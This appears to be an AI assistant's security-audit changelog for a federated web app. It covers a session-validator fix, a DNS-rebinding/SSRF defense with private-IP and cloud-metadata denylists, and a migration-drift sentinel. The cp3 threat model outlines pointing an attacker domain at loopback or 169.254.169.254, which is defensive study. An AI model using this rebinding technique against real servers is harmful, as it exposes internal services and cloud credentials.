| `apps/web/src/lib/crypto/pairedSession.ts` | Persistent paired-readonly session record |
| `apps/web/src/lib/stores/identity.ts` | bootFromPairedSession + handleStorageEvent |
| `packages/operator-config/src/matrixAddress.ts` | MXID + Room Alias branded-type parsers |

### Method — 26 AVs enumerated

Black-hat enumeration before code-walking, per cp1 pattern lesson. STRIDE-classified each, tested empirically. Full AV table is in the cp4 section of TARBALL.md head; abridged here:

- **AV1-7 — matrix-bot side** (sendDm injection, HTML body injection, dmRoomCache poisoning, etc.): all clean. Brand-typed MXIDs prevent @↔# confusion at compile time; renderAlertBody runs `escapeHtml` on every dynamic field (title, advice, payloadLines, source, ts); tier+sigil are static enums; classifier sanitization (cp18 AUDIT-1/2/3 + cp19 AUDIT-4) caps payload + strips C0 + defangs mxid pills.
- **AV8-15 — QR-pair handshake**: all clean. `verifyDeliveryPayload` walks a tight defense chain: version check → pid check → AEAD decrypt with AAD-bound pid (relay can't shuffle bundles) → envelope shape validation (every field typed) → epk_echo + origin_echo + pid echo checks → signed_at freshness window (-120s/+30s) → chain-anchored signature verification with weight-threshold check. `sodium.memzero` wipes ephemeral priv + AEAD key + shared secret in `finally` blocks regardless of decrypt success.
- **AV16-21 — runtime/operational**: relay endpoint type confusion clean (branded types), invite token binding clean (cp9 audit), QR `relay` URL pointing at private IP NOT_A_BUG_GIVEN_THREAT_MODEL (phone's loopback receives only encrypted-but-signed public info; no leak), phone-as-attacker / desktop-as-attacker explicitly OUT_OF_SCOPE per ADR-0022.
- **AV22 — F9 finding** (see below).
- **AV23 — cross-tab storage event CSRF**: clean. `handleStorageEvent` uses defense-in-depth pattern: re-validates via canonical `readPairedSession` (line 449) so a hostile same-origin tab writing garbage gets caught by `isValidPairedSession`.
- **AV24 — crypto memory hygiene**: verified. Three `sodium.memzero` calls in `verifyDeliveryPayload`: shared secret (line 617), AEAD key (line 626), desktop ephemeral priv (line 632, in `finally` so it fires regardless of success/failure).
- **AV25 — multisig accounts**: documented limitation. `defaultVerifier` requires single-key weight ≥ threshold; multisig accounts can't pair with this version. pairingClient.ts has an explicit comment ("Honest limitation: document, don't pretend to support") so the limit is visible.
- **AV26 — pairingId stored but unused**: clean. Forensic-correlation metadata; never read by any security-decision code path; length-capped to prevent storage bloat.

### F9 (LOW) — defense-contract drift in pairedSession validator

**The finding.** `apps/web/src/lib/crypto/pairedSession.ts` `isValidPairedSession()` has a comment that promises:

> Reject obviously-bogus timestamps (negative, far past, far future).

The code immediately below only enforced two of three:

```typescript
if (r.pairedAt < 0 || r.pairedAt > now + 86400) return false;
```

`r.pairedAt < 0` catches "negative". `r.pairedAt > now + 86400` catches "far future". There is NO "far past" check. A paired-session record with `pairedAt: 0` (1970-01-01) passes validation.

**Same drift in the test suite.** `pairedSession.test.ts` has:
- `'rejects negative pairedAt'` ✓ matches code
- `'rejects far-future pairedAt (more than 24h ahead)'` ✓ matches code
- (no "rejects far-past pairedAt" test) ✗ matches the buggy code

So the contract drift is consistent across docblock + code + tests. The test suite doesn't catch the drift because the test fixture file shares the same gap. cp21 pattern: schema-as-contract smokes only execute when their preconditions hold; here, the defense contract was in the docblock but never enforced.

**Severity LOW because:** no current code path reads `pairedAt` for any age decision. The paired session has no active expiration policy. A 1970-epoch session record would deserialize fine and be used as a valid session — but the user would only get one if they wrote it themselves (no attacker path to install one in someone else's localStorage that isn't already a worse compromise). The contract drift is real; the live exploit surface is empty.

**Why fix anyway:** (a) the docblock comment is a contract promise; the code violates it. (b) Future code paths that add "expire paired sessions after N days" would expect the validator to reject 1970 sessions. (c) Pre-launch is the right moment to close defense-contract drift, same rationale as cp3's REVISIT §A closure.

### Fix

```typescript
const MAX_PAIRED_AGE_SECONDS = 365 * 86400;

function isValidPairedSession(x: unknown): x is PairedSession {
  // ... existing checks ...
  const now = Math.floor(Date.now() / 1000);
  if (r.pairedAt < 0) return false;
  if (r.pairedAt > now + 86400) return false;             // far future: > 24h ahead
  if (r.pairedAt < now - MAX_PAIRED_AGE_SECONDS) return false; // far past: > 365d behind (cp4 F9 fix)
  return true;
}
```

The 365-day cutoff is a sanity bound, not an active expiration policy. Generous enough that any active user with low-activity devices passes (real re-pair cadence is 30-90 days); tight enough that obvious 1970 attacks fail. Round number, easy to reason about, documented with rationale in code.

### Test coverage

Added 2 new vitest cases to `pairedSession.test.ts`:

```typescript
it('rejects far-past pairedAt (more than 365 days behind) — Part 122 cp4 F9', () => {
  writeRaw({ ...VALID, pairedAt: Math.floor(Date.now() / 1000) - 400 * 86400 });
  expect(readPairedSession()).toBeNull();
});

it('accepts pairedAt within MAX_PAIRED_AGE_SECONDS window (300 days ago)', () => {
  writeRaw({ ...VALID, pairedAt: Math.floor(Date.now() / 1000) - 300 * 86400 });
  expect(readPairedSession()).not.toBeNull();
});
```

The boundary cases bracket the 365-day cutoff: 400d rejected, 300d accepted.

### Sentinel — `P122-CP4-F9`

Pins all three legs of the docblock contract:

```typescript
{
  name: 'P122-CP4-F9 — pairedSession validator rejects far-past timestamps (matches docblock contract)',
  file: 'apps/web/src/lib/crypto/pairedSession.ts',
  rootRelative: true,
  mustHave: [
    'MAX_PAIRED_AGE_SECONDS',
    '365 * 86400',
    'r.pairedAt < 0',                              // negative leg
    'r.pairedAt > now + 86400',                    // far-future leg
    'r.pairedAt < now - MAX_PAIRED_AGE_SECONDS'    // far-past leg (the cp4 fix)
  ]
}
```

Self-tested by tampering: removed the `r.pairedAt < now - MAX_PAIRED_AGE_SECONDS` line → sentinel correctly fails with `MUST HAVE (not found)`. Restoration → clean.

### Verification

- Triple-pulse 2,959 × 3, 0 failures (cp3 baseline 2,958 → cp4 baseline 2,959 = +1 P122-CP4-F9 sentinel)
- Typecheck-sweep 0 errors across all 9 workspaces
- F9 sentinel self-tested under tampering
- Pre-existing `pairedSession.test.ts` vitest cases still all pass (extended with cp4's two new boundary cases)
- ansible-lint NOT re-verified (sandbox-environmental)

### Pattern lessons

1. **Defense contracts in docblock comments must match defense reality in code.** Same class as cp22's "13 runners" stale claim, but inside a security-critical validator. The mismatch is invisible to the operator until a feature relying on the promised contract gets written — then the gap becomes an exploit.

2. **Test fixtures share the bias of the code they test.** pairedSession.test.ts had tests for negative + far-future (matching the buggy code) but not far-past (which the code didn't check). Test suites that exist solely to verify the implementation can't catch the implementation-vs-contract drift; only an external reviewer reading both docblock and code can. Audit checklist item.

3. **"No current exploit surface" doesn't mean "no fix needed."** F9 has no live attack today because nothing reads `pairedAt` for age decisions. Pre-launch is precisely the right time to close gaps that have no live exploit — the cost is low and the gap closes before any future code path opens it.

4. **Black-hat enumeration of well-audited code yields confirmation, not findings.** 25 of 26 AVs concluded with "existing defense holds." That's the audit doing its job — pre-launch sanity check that the cp9-cp19 work has aged well. The one finding (F9) was discovered by reading the docblock comment against the code, not by attacking the code from outside.

5. **AAD-bound encryption is the right primitive for shuttle protocols.** The QR-pair flow's ChaCha20-Poly1305 AEAD with `aad = pid bytes` means the relay (an untrusted intermediary) cannot shuffle ciphertext between sessions: a bundle decrypted with the wrong pid as AAD fails authentication. This pattern generalizes — any protocol with an intermediary that shuttles encrypted bundles should bind session identifiers into AEAD AAD.

### Files modified

```
apps/web/src/lib/crypto/pairedSession.ts        (F9 fix: MAX_PAIRED_AGE_SECONDS + far-past check)
apps/web/src/lib/crypto/pairedSession.test.ts   (2 new vitest cases: far-past rejected, 300d accepted)
apps/web/scripts/persona-walkthrough-smoke.ts   (P122-CP4-F9 sentinel — 112 → 113 scenarios)
TARBALL.md                                      (this entry)
docs/REVISIT-LIST.md                            (cp4 maintained-line)
docs/AUDIT-2026-05.md                           (cp4 entry)
```

No brag-list edit (audit findings per cp19 discipline). No ADR (no architectural shift). No locale edits. No schema migration.

---

## Part 122 cp3 — DNS-rebinding closure in federation-probe SSRF defense (cp7 REVISIT §A closed)

### Pretext

cp7 (Part 121, two weeks ago) shipped per-locale prerendering as its main work but ran a scoped deep-deep on federation-probe + SQL/DB + HTTP/API + operator-trust as item #2. The federation-probe audit surfaced a DNS-rebinding gap in `apps/indexer/src/indexer/federationProbe.ts` — the existing hostname-string check caught literal-private hostnames (`https://127.0.0.1/`) but a hostname resolving to a private IP at fetch time would bypass the check. cp7 filed it as REVISIT §A: "information-disclosure only — damage bound by GET-only + 256KB cap + no exfiltration path. Schedule alongside any other federation-touch work."

Pre-launch (~2026-05-22) is the right moment. cp3 closes it.

### Threat model recap

An attacker registers `evil.example.com` as a federated operator's origin. At registration time the hostname doesn't match the literal-denylist (it's not `localhost`, not `127.x.x.x`, not `.local`, etc.) and the registration handler accepts it. Some time later, the federation probe fires its periodic GET to `https://evil.example.com/v1/instance`. The attacker has CNAME'd that to `127.0.0.1` (or `169.254.169.254` AWS metadata, or an internal RFC 1918 service). The fetch lands on the indexer's own loopback or internal network.

Damage bound by cp7-era defenses:
- `redirect: 'manual'` prevents redirect-based exfiltration
- 256KB response cap (header pre-check + streaming abort)
- GET-only — can't write to internal services
- User-agent identifies the probe — easy to log

But: information disclosure of internal service presence/response shape (up to 256KB), and DoS by forcing probes against arbitrary internal targets.

### Three-layer defense shipped

**Layer 1 — `isPrivateHostname(h)`** refactored from inline regex pile in `fetchJson` into an exported function. Same denylist as before: IPv4 RFC 1918, 169.254/16, `localhost`, `0.0.0.0`, IPv6 loopback in both `::1` and `[::1]` forms, IPv6 unique-local (`fc00::/7`), IPv6 link-local (`fe80::/10`), AWS metadata `169.254.169.254`, GCP metadata `metadata.google.internal`, and the `.local`/`.localhost`/`.internal` TLDs. Now also exported so the new dns-rebinding-defense-smoke can unit-test it.

**Layer 2 — `resolveAndValidatePublicIp(hostname)`** is new. Uses `node:dns/promises.lookup(hostname, { all: true, verbatim: true })` to retrieve EVERY A + AAAA record. Validates each one against `isPrivateIp(ip)`, throws if ANY is private. The "all must be public" stance (rather than "first must be public") defends against the attacker returning a mixed response like `[203.0.113.1, 127.0.0.1]` — if even one is private, the entire response is rejected, so a later connection that selects a different record can't land on the private IP.

`isPrivateIp(ip)` is also new and covers more cases than the original hostname check:
- IPv4 patterns same as hostname check (127/8, 10/8, 192.168/16, 172.16-31/12, 169.254/16)
- 0.0.0.0/8 unspecified range
- 255.255.255.255 broadcast
- **CGNAT 100.64/10** (RFC 6598) — added in cp3 because some operators have internal services in this range; treating as private is the safer default
- IPv6 `::` and `::1`
- IPv6 ULA (`fc00::/7`)
- IPv6 link-local (`fe80::/10`)
- **IPv4-mapped IPv6 unwrap** (`::ffff:a.b.c.d`) — recursively re-validates as IPv4. This is the subtle one: an attacker could return `::ffff:127.0.0.1` as a AAAA record; without the unwrap, our IPv6 patterns wouldn't catch it because the loopback part is wrapped inside an IPv4-mapped form.

**Layer 3 — `buildPinnedAgent(hostname, ip, family)`** returns an `undici.Agent` whose `connect.lookup` hook is hard-coded to return `(hostname, ip, family)`. This closes the TOCTOU between Layer 2's pre-validation lookup and undici's own connect-time lookup. Without this, between our resolve-and-validate (Layer 2) and undici's actual connection (which would do its OWN DNS lookup), the attacker could swap the DNS response — Layer 2 sees the public IP, undici sees the private IP, connection lands on the private network.

By passing `dispatcher: pinnedAgent` to fetch, we tell undici "use THIS connect.lookup, not the real DNS." The lookup hook returns the pre-validated IP directly; no second DNS call happens. The TOCTOU window closes to zero.

Defensive bonus: the lookup hook also CHECKS the hostname being looked up matches the pre-validated one. If `redirect: 'manual'` ever leaks (or a future undici behavior change tries a different hostname), the hook fails closed.

### Test injection hook

Added `_setDnsResolverForTesting(resolver | null)` exported from federationProbe.ts. Production runs leave `_dnsResolverForTesting = null` and the real `resolveAndValidatePublicIp` is used. The existing `federation-probe-smoke.ts` (which stubs `globalThis.fetch` for offline-deterministic testing) now also installs a stub resolver returning `{ address: '203.0.113.1', family: 4 }` (RFC 5737 documentation IP — never routable, always validates as public). Without this stub, the new Layer 2 would attempt real DNS lookups for synthetic test hostnames like `test.example` which would fail with NXDOMAIN, breaking the smoke.

### New smoke — `dns-rebinding-defense-smoke.ts` (45 scenarios)

Pure-unit smoke for the validation helpers. Coverage:
- Layer 1 (`isPrivateHostname`): 21 scenarios covering all denylist branches + case-insensitivity + IPv4 boundary cases (172.15 public / 172.16 private / 172.31 private / 172.32 public) + public anchor (morphit.io, 8.8.8.8)
- Layer 2 (`isPrivateIp`): 23 scenarios covering all IPv4 ranges + IPv6 ULA + IPv6 link-local + IPv4-mapped IPv6 unwrap (lowercase + uppercase + nested-private) + CGNAT lower bound (100.64) + upper bound (100.127) + just-below (100.63 public) + just-above (100.128 public) + public anchors (8.8.8.8, 203.0.113.1, 2001:db8::1, 2606:4700::1)
- Layered interaction: 1 scenario verifying Layer 1 catches before Layer 2 fires for direct literal-private hostnames (the cheap path that doesn't need DNS)

Registered in `scripts/run-smokes.sh` right after `federation-probe-smoke`.

### Persona-walkthrough sentinel — `P122-CP3`

Locks all three layers in code + the test-injection hook + the import lines for `undici` Agent and `node:dns/promises`. Specifically requires:
- `export function isPrivateHostname` — Layer 1 export
- `export function isPrivateIp` — Layer 2 export
- `resolveAndValidatePublicIp` — Layer 2 function name
- `buildPinnedAgent` — Layer 3 function name
- `dispatcher: pinnedAgent` — the actual wiring of Layer 3 into fetch()
- `import { Agent } from 'undici'` — Layer 3 dependency
- `import { lookup as dnsLookup } from 'node:dns/promises'` — Layer 2 dependency
- `::ffff:` — IPv4-mapped IPv6 unwrap (the subtle one)
- `100\.(6[4-9]` — CGNAT range (a less-obvious addition someone might drop)

Self-tested by tampering: removed `dispatcher: pinnedAgent` line from federationProbe.ts → sentinel correctly fails with `MUST HAVE (not found): "dispatcher: pinnedAgent"`. Restored → clean.

### operatorRegister.ts inline comment

Updated the comment at line 218-227 that previously read:

> Strategy: reject the obvious bad classes by hostname pattern. This list is not exhaustive (DNS rebinding, IPv6 mapped IPv4, etc.); the probe layer should ALSO resolve+validate the IP before connecting (deferred follow-on).

Now reads:

> Strategy: reject the obvious bad classes by hostname pattern. This list catches literal-private-hostname attacks. The full DNS-rebinding closure (resolve + validate every returned IP + pin via custom undici dispatcher to prevent TOCTOU) lives in the probe layer at `federationProbe.ts:fetchJson()` — shipped Part 122 cp3, sentinel-locked by `P122-CP3`. The registration-time check here is defense-in-depth; the probe-time check is the authoritative one.

### Verification

- Triple-pulse 2,958 × 3, 0 failures (cp2 baseline 2,911 → cp3 baseline 2,958 = +47 = 45 dns-rebinding-defense + 1 P122-CP3 sentinel + 1 federation-probe-smoke re-tally)
- Typecheck-sweep 0 errors across all 9 workspaces (including the new `import { Agent } from 'undici'` and `import { lookup as dnsLookup } from 'node:dns/promises'`)
- Existing federation-probe-smoke passes 14/14 with the new resolver-stub injection
- New dns-rebinding-defense-smoke passes 45/45
- Sentinel self-tested by `dispatcher: pinnedAgent` line removal → fires correctly; restoration → clean
- ansible-lint NOT re-verified (sandbox-environmental)

### Pattern lessons

1. **TOCTOU between validation and use is a class problem, not a one-off.** Our Layer 2 (resolve-and-validate) is necessary but not sufficient on its own — the second lookup undici would do at connect time could return a different answer. Layer 3 (pinned dispatcher) closes the window to zero by ensuring there's only ONE lookup, controlled by us. Any future "validate this resource before using it" code path should ask "is there a way for the resource to change between validation and use?"

2. **IPv4-mapped IPv6 is the kind of trap auditors miss.** A defense that checks `127.x.x.x` and `::1` separately can miss `::ffff:127.0.0.1` entirely. The unwrap-and-revalidate pattern (recursive call to the same function) is small but easily forgotten. Sentinel pins its presence.

3. **CGNAT 100.64/10 is a real operator concern.** Some operators have internal services in this range (it's allowed per RFC 6598 for ISP-internal networks). Treating it as private is the safer default — false positives (rejecting a legitimate CGNAT-served public service) are recoverable; false negatives (probing internal services) are not.

4. **Test injection hooks are part of the defense contract.** Without `_setDnsResolverForTesting`, the existing federation-probe-smoke would have broken on the new DNS layer, and we'd have been tempted to gate the new defense behind a `NODE_ENV` check or similar. Test hooks let the production code be unconditional while smokes stay offline-deterministic. Pin the hook in the sentinel so it doesn't get refactored out.

5. **REVISIT §A items deserve closure even when "deferred for damage bound by other defenses."** Cp7 correctly judged this not a launch blocker. But "not a launch blocker" doesn't mean "not worth closing pre-launch." The defense-in-depth value of closing it now is higher than the cost (one afternoon's work), and the LIVE threat surface opens at launch — closing it before launch means the first-day attackers don't get to play with the gap.

### Files modified

```
apps/indexer/src/indexer/federationProbe.ts                    (3-layer defense + test hook)
apps/indexer/src/indexer/handlers/operatorRegister.ts          (inline comment updated to reference cp3 closure)
apps/indexer/scripts/federation-probe-smoke.ts                 (resolver-stub injection)
apps/indexer/scripts/dns-rebinding-defense-smoke.ts            (NEW — 45-scenario unit smoke)
apps/web/scripts/persona-walkthrough-smoke.ts                  (P122-CP3 sentinel — 111 → 112 scenarios)
scripts/run-smokes.sh                                          (register new smoke)
TARBALL.md                                                     (this entry)
docs/REVISIT-LIST.md                                           (cp3 maintained-line + §A marked CLOSED with archive of original cp7 finding)
docs/AUDIT-2026-05.md                                          (cp3 entry)
```

No brag-list edit (security findings per cp19 discipline). No ADR edit (no architectural shift — three defense layers, same probe architecture). No locale edits. No schema migration.

---

## Part 122 cp2 — F3 + F4 audit sweep + F5 (schema-migration drift class) sentinel

### Pretext

cp1 filed F3 (schema-as-contract pattern generalization) and F4 (sidecar observability sweep) as cp2 scope. Both were framed during cp1 with the hypothesis that cp21's "silently no-op'd satisfies-clauses" and cp22's apt-monitor timeout-mask were instances of broader patterns affecting many places. cp2 = empirical sweep to confirm or refute that hypothesis, then ship concrete fixes where real gaps remain.

### F3 audit — `mustNotHave` sentinel review

Walked every `mustNotHave` entry in `apps/web/scripts/persona-walkthrough-smoke.ts` (23 of them). Hypothesis: a sentinel asserting absence of `OLD_NAME` doesn't catch a refactor to `NEW_NAME`. Silent-no-op risk.

Empirical result: **almost every mustNotHave is paired with a mustHave that anchors the correct current value.** Example:

```typescript
{
  name: 'D-4 — PRE-LAUNCH reflects schema v32, not v31',
  mustHave: ['currently at v32 as of Part 121'],     // ← drift-anchor
  mustNotHave: ['currently at v29 as of Part 108++'] // ← regression sentinel
}
```

If the doc drifts to "currently at v30 as of Part 110", the mustHave fails (the v32 string isn't there). If the doc reverts all the way back to the v29 wording, both halves fail. The audit hypothesis missed this because my initial python grep extracted only mustNotHave blocks; manually re-walking confirmed the mustHave was present in every drift-prone case (D-4, D-9, D-10, S-12, D-6, D-7, D-8).

Of the unpaired mustNotHave cases (D-1, D-2 LAUNCH-DAY copy, D-3, D-5, D-11, D-12, D-13, P121-CP6-6, P121-CP6-7, P121-CP9-1, P121-CP20-2), all defend against SPECIFIC named ghost strings (literal env-var names, literal command names, literal import paths) — the regression class they're catching IS "this specific wrong string reappearing", not "any synonym of the wrong concept." Different defense intent, no silent-no-op risk.

**F3 audit conclusion: existing sentinels are well-designed. No fix needed for the audited sentinels.** Filed F7 (LOW) for cp3+ as a polish opportunity: a future `assertNoRegexMatch` runner primitive would let the S-12 ariaLabel sentinel switch from listing 3 specific hardcoded strings to a regex-based "no hardcoded ariaLabel" assertion. Spot-check confirmed no hardcoded ariaLabels in current code, so this is theoretical polish, not a live gap.

### F4 audit — sidecar observability sweep

Walked every `|| true` / `2>/dev/null` pattern across all 12 sidecars. Hypothesis: silent-failure patterns like apt-monitor's pre-cp1 state exist in dmesg-monitor, journald-monitor, smartctl-monitor, etc.

Empirical result: **every sidecar already has a `_unavailable` precheck.** apt-monitor, certbot-monitor, compose-monitor, dmesg-monitor, fail2ban-monitor, journald-monitor, mdadm-monitor, postfix-monitor, smartctl-monitor, systemd-monitor, trivy-monitor — each has a `command -v <tool>` check at the top that emits an INFO-tier `<tool>_unavailable` event if the underlying binary isn't present. Classifier ALERT_COPY map has entries for all of these (cp22 + earlier cp work).

The `|| true` patterns I was worried about (e.g. `dmesg --time-format iso 2>/dev/null || true` at dmesg-monitor.sh:59) are belt-and-braces for the post-precheck race case — if dmesg IS readable at line 50 but somehow fails between line 50 and line 59, the script keeps going with empty output and downstream logic gracefully handles that (returns no events). Operator gets no false alerts; if the tool TRULY breaks, the precheck fires next run.

The cp22 apt-monitor F2 was a different shape — a NEW failure mode (timeout) was added in cp22 work and the timeout's failure semantics were swallowed by the same `|| true` that handled the legitimate dpkg-lock case. THAT was a regression introduced by the cp22 fix, not a pre-existing pattern across other sidecars.

**F4 audit conclusion: existing sidecars are well-designed. No additional fixes needed. Pattern lesson captured for forward-looking rule: any FUTURE timeout-wrap added to a sidecar must emit an INFO event on non-zero exit.** Not a code change; a discipline rule.

### F5 (MEDIUM) — schema-migration drift class

While auditing F3 (looking for "silent no-op" patterns elsewhere), surfaced a real one in the migration model.

`apps/indexer/src/db/migrations.ts` declares `MIGRATIONS[]` with exactly ONE entry: `version: 1` with `subsumesVersions: [2..27]`. The comment block says "Future migrations land here. The collapse happens once pre-launch; from this point forward, every new schema change is its own additive migration with its own version number (28, 29, ...)."

But `apps/indexer/src/db/schema.sql` contains v28, v29, v30, v31, v32 changes INLINE — they're DDL appended to the v1-collapsed schema, not separate migrations. Comments in schema.sql label them:

```
-- ─── v28 ────────────────────────────────────────────
-- ─── Migration v29 — XMR per-payment tx_proof (Part 108++) ────────
-- ─── Migration v30 — Operator-scoped payout queue (Part 111) ─────────────
-- ─── Migration v31 — Signal C: one-way pile-on detection (Part 113) ───────
-- v32 / Part 121 — multi-network asset support (USDT)
```

Pre-launch this works perfectly: every fresh deploy runs schema.sql which contains all v28-v32 DDL, ending at "v32 state." The migration runner records v1 as applied with v2-v27 subsumed. No bug.

**The latent foot-gun lands at first production deploy + first post-launch schema change.** Consider: production deploy installs schema.sql (DB is at v32 state, schema_migrations records v1+subsumed v2-v27). Months later, someone adds v33 DDL. If they add it INLINE to schema.sql without ALSO adding `MIGRATIONS[v33]`, the upgrade-install runs `runMigrations()`, sees v1 already applied, has nothing else to apply, exits clean. v33's DDL never runs on the production DB.

`validateMigrationsContract()` doesn't catch this — it only checks the `MIGRATIONS[]` array's internal consistency, not schema.sql's contents vs the array.

**Fix shipped this turn:** new `P122-CP2-F5` sentinel in persona-walkthrough-smoke.ts pinning schema.sql's current canonical head-version comment:

```typescript
{
  name: 'P122-CP2-F5 — schema.sql canonical head version pinned (cp1 F5 fix)',
  file: 'apps/indexer/src/db/schema.sql',
  rootRelative: true,
  mustHave: ['v32 / Part 121 — multi-network asset support (USDT)']
}
```

If someone adds v33 DDL to schema.sql, the comment header changes (or a new comment header appears that the maintainer should be thinking about), and the sentinel will hopefully fire OR the maintainer will consciously update the sentinel — either way they're FORCED to think about whether they also need a `MIGRATIONS[v33]` entry.

Three-way drift-anchor protecting the same invariant:
1. `apps/indexer/src/db/schema.sql` — the canonical DDL
2. `docs/PRE-LAUNCH-CHECKLIST.md` D-4 sentinel — pins "currently at v32 as of Part 121"
3. `apps/web/scripts/persona-walkthrough-smoke.ts` P122-CP2-F5 sentinel — pins the schema.sql head comment

Any future schema bump requires updating all three (plus adding the new MIGRATIONS entry post-launch). Drift between any pair surfaces as a smoke failure.

Self-tested by simulating a v33 inline addition: temporarily replaced the v32 comment with `-- v33 / Part 122 — hypothetical future feature`, ran the smoke — P122-CP2-F5 correctly failed with `MUST HAVE (not found): "v32 / Part 121 — multi-network asset support (USDT)"`. Restored → clean.

**Why MEDIUM and not HIGH:** the bug only manifests post-launch + post-first-schema-change. Pre-launch every deploy is fresh and applies the full schema.sql. The sentinel closes the future risk now, before any chance of the foot-gun firing.

### Verification

- Triple-pulse 2,911 × 3, 0 failures (cp1 baseline 2,910 → cp2 baseline 2,911 = +1 P122-CP2-F5 sentinel)
- Typecheck-sweep 0 errors across all 9 workspaces
- F5 sentinel self-tested under v33-tampering: fires correctly; restoration → clean
- ansible-lint NOT re-verified (sandbox doesn't have it; cp2 touched zero Ansible files)

### Pattern lessons

1. **Audit conclusions of "no fix needed" are valuable findings.** F3 + F4 both came in expecting to find broad patterns of silent-no-op defenses; the empirical sweep showed existing defenses hold up. Time spent confirming "the system is defended where we thought it might not be" is not wasted time — it's the only way to ground future audit framing.

2. **Initial grep-based audit framing can mislead.** F3's hypothesis ("mustNotHave sentinels can silently no-op") was framed before I'd extracted the FULL context for each sentinel — only the mustNotHave block. The paired mustHave drift-anchor was the missing piece. Lesson: extract full context (both halves of any paired defense) before forming hypothesis.

3. **Schema-as-contract auditing finds drift in OTHER schemas too.** F5 surfaced while auditing F3-style "silent no-op" patterns in sentinels — it's a structurally identical pattern in a totally different subsystem (migration runner vs sentinel-grep smoke). The bug class generalizes across "any defense layer that validates its own structure but not its relationship to a related artifact."

4. **Drift-anchors compound.** Three sentinels (schema.sql comment, D-4 doc check, P122-CP2-F5 head pin) all defend the same invariant (schema version is what we think it is). Any single one drifting causes only that ONE sentinel to fail; the others provide context for diagnosis. Three-way is overkill for most invariants but appropriate for a foot-gun whose first manifestation is a corrupt production DB.

5. **Forward-looking discipline rules are deliverable artifacts.** F4's pattern lesson ("future timeout-wraps must emit observable signal on non-zero exit") is documented but not enforced by any sentinel. That's intentional — the rule is for human eyes during code review, not a mechanical check. Some defenses are written as rules in TARBALL/REVISIT, not as code.

### Files modified

- `apps/web/scripts/persona-walkthrough-smoke.ts` — new P122-CP2-F5 sentinel (110 → 111 scenarios)
- `TARBALL.md` — cp2 entry
- `docs/REVISIT-LIST.md` — cp2 maintained-line + F7 polish item
- `docs/AUDIT-2026-05.md` — cp2 entry

No code changes outside the sentinel addition. No brag-list edit (audit work per cp19 discipline). No ADR edit. No locale edits. No schema migration.

---

## Part 122 cp1 — black-hat audit of cp20–cp22 delta surfaces; F1 (security warning placement) + F2 (apt-monitor observability) closed

### Pretext

After cp22 sealed (closing 3 cp21-pending items), Ken asked whether it was time for deep-deep code/security audits. I argued yes-but-scoped: a full-codebase walk would re-cover cp18/cp19 cleared surface, but the cp20-cp22 delta surfaces, the federation-probe DNS-rebinding gap (cp7 REVISIT §A), and a Matrix/relay black-hat redux haven't had a fresh black-hat pass. Ken said "go." Part 122 opened. cp1 covers the cp20-cp22 delta surfaces.

### Audit method

Standard black-hat enumeration across each new attack surface introduced cp20-cp22, with STRIDE classification for each. 24 attack vectors (AV1-AV24) probed; full list with disposition:

- **AV1** (Tampering/Info disclosure): hostile tester content injection into Forgejo template rendering. → **NOT_A_BUG** — testers fill the issue body BELOW the auto-loaded template; Forgejo's markdown render of that body is normal Forgejo behavior, not template-specific.
- **AV2** (Spoofing): homograph attack on the Matrix room URL. → **CLEAN** — `config.yml` is pure ASCII in the URL/label fields; the non-ASCII bytes that exist are em-dashes (U+2014) and section sign (U+00A7) in inline comments, not URL content.
- **AV3** (auth bypass): direct `/issues/new?` URL bypassing the picker. → **OUT_OF_SCOPE** — Forgejo-config concern (`blank_issues_enabled: false`). No Morphit-config attack surface.
- **AV4** (Info disclosure, HIGH): **F1 — Security warning at §16 too far below §1.** A tester reporting a security vuln would type it into §1 (one-line summary, line 14 of the rendered body) BEFORE scrolling 15 sections to see the "DO NOT POST PUBLICLY" warning at §16 (line 222). Even if they read top-to-bottom, by the time they see the warning, they've already typed the vuln summary into §1's text editor. Forgejo's draft-autosave might persist that. STRIDE = Information Disclosure, severity HIGH because a tester finding a real vuln (which is exactly the kind of beta-testing we want) gets the warning AFTER making the disclosure mistake.
- **AV5** (default-safe ordering): §16 dropdown shows "No — safe to post publicly" first which is reasonable for the common case (most reports aren't security-sensitive), and the "Yes — STOP, use Matrix DM instead" option is listed first per the cp20 design. → **CLEAN**.
- **AV6** (Tampering): hostile mount-target names through host-monitor mount-sweep. df output with newline/escape-bearing mount names could in theory inject ghost mount events. → **NOT_A_BUG_GIVEN_THREAT_MODEL** — defense layers in place: (a) strict numeric regex on `mount_pct_num` skips malformed rows; (b) `json_str` (cp18 hardening) escapes all C0 chars in the path. The attack also requires root/CAP_SYS_ADMIN to create the mount in the first place, at which point the operator's already compromised. Filed as defense-in-depth note.
- **AV7** (Info leak): could the new `signal` field on `RunResult` leak privileged info? → **NOT_A_BUG** — `NodeJS.Signals` is a static union of signal names ("SIGTERM", "SIGKILL", etc.); no payload, no info leak.
- **AV8** (Info disclosure): TS6133 regex fix surfacing latent unused-var warnings as typecheck errors. → **CLEAN** — empirical typecheck-sweep run post-cp22: 0 errors across all 9 workspaces. No latent unused-vars currently emit.
- **AV9** (Supply chain): upload-artifact SHA verification. → **VERIFIED** — SHA `ea165f8d65b6e75b540449e92b4886f43607fa02` came from the release tag page on github.com; commit page asserts GitHub's verified GPG signature (key B5690EEEBB952194). Trust anchor = GitHub's TLS + their tag-signing policy. Not maximally verified (didn't `gpg --verify` locally with their public key); filed as REVISIT for upgrade-tooling sprint.
- **AV10** (Tampering): public Matrix room link tampered in transit. → **OUT_OF_SCOPE** — would require Forgejo repo compromise or MITM of github.com (no morphit-attackable surface).
- **AV11** (Artifacts): stale-route cleanup left exploitable artifacts. → **CLEAN** — no remaining references in code or docs to pre-cp7 paths beyond the regression sentinel (which is designed to detect re-introduction).
- **AV12** (Defense-no-op pattern): generalization of cp21's "silently no-op'd schema-as-contract" lesson. What other defense layers might be silently no-op'ing? → **FILED as F3** — out of cp1 scope, will sweep in cp2.
- **AV13** (Sentinel drift): persona-walkthrough sentinels pinning the cp22-edited doc claims still match. → **VERIFIED** — sentinels pin stable strings (`ERR_MODULE_NOT_FOUND`, `@morphit/asset-registry`, etc.), not the drifted "13 runners" count. cp22's doc edits remain compatible.
- **AV14** (Info disclosure, MEDIUM): **F2 — apt-monitor silently masks `apt-get update` failures.** The cp22 pattern `timeout 20 apt-get update -qq 2>/dev/null || true` continues even on timeout (exit 124) or dpkg-lock (exit 100) or mirror error. The subsequent `apt list --upgradable` then operates on stale cached lists, producing a stale upgrade count with no operator-visible signal. An operator's mirror could be effectively down for a week and they'd never know. STRIDE = Information Disclosure (missed-signal class), severity MEDIUM because exploit doesn't compromise the system but blinds the operator to legitimate security-update alerts.
